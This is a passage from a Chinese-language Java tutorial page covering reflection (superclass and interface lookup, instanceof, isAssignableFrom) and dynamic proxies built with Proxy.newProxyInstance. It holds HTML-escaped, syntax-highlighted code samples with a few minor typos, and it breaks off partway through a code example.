&lt;li>同上面，可以有&lt;code>setAccessible(true)&lt;/code>来调用非public的Constructor&lt;/li>
&lt;/ul>
&lt;h3 id="获取继承关系">获取继承关系&lt;/h3>
&lt;ul>
&lt;li>最开始的三级标题Class中提到了三种方式获取Class实例，他们都是同一个实例，因为JVM对每个加载的&lt;code>Class&lt;/code>只创建一个&lt;code>Class&lt;/code>实例来表示它的类型&lt;/li>
&lt;li>获取父类Class&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getSuperclass&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>获取接口，&lt;code>getInterfaces&lt;/code>只返回当前类直接实现的接口类型，不包括父类；如果一个类没有实现任何&lt;code>interface&lt;/code>，那么&lt;code>getInterfaces&lt;/code>返回空数组&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">is&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInterfaces&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">is&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>当我们判断一个实例是否是某个类型时，正常情况下使用&lt;code>instanceof&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isDouble&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Double&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isInteger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isNumber&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#111">isSerializable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>如果是两个&lt;code>Class&lt;/code>实例，要判断一个向上转型是否成立，可以调用&lt;code>isAssignableFrom()&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Integer i = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true，因为Integer可以赋值给Integer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Number n = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true，因为Integer可以赋值给Number
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Object o = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true，因为Integer可以赋值给Object
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Integer i = ?
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAssignableFrom&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Number&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false，因为Number不能赋值给Integer
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="动态代理">动态代理&lt;/h3>
&lt;ul>
&lt;li>&lt;code>class&lt;/code>可以实例化而&lt;code>interface&lt;/code>不可以，所有&lt;code>interface&lt;/code>类型的变量总是通过某个实例向上转型并赋值给接口类型变量&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">CharSequence&lt;/span> &lt;span style="color:#111">cs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>静态方式&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 定义接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Hellp&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 编写实现类
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloWorld&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Hellp&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Good morning, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 创建实例 转型为接口并调用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HelloWorld&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>动态代理Dynamic Proxy可以在运行期动态创建某个&lt;code>interface&lt;/code>的实例，不编写实现类，直接通过&lt;code>Proxy.newProxyInstance()&lt;/code>创建一个&lt;code>Hello&lt;/code>接口对象&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Proxy&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// InvocationHandler实例负责实现接口的方法调用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">proxy&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;morning&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Good mornig, &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#111">hello&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#75715e">// 返回的Object强制转型为接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#75715e">// 使用的ClassLoader 通常为接口类的ClassLoader
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#75715e">// 需要实现的接口数组 至少传入一个接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 用来处理接口方法调用的InvocationHandler实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>动态代理实际上是JVM在运行期动态创建class字节码并加载的过程，上面的改写为静态实现是这样的&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HelloDynamicProxy&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">HelloDynamicProxy&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">morning&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
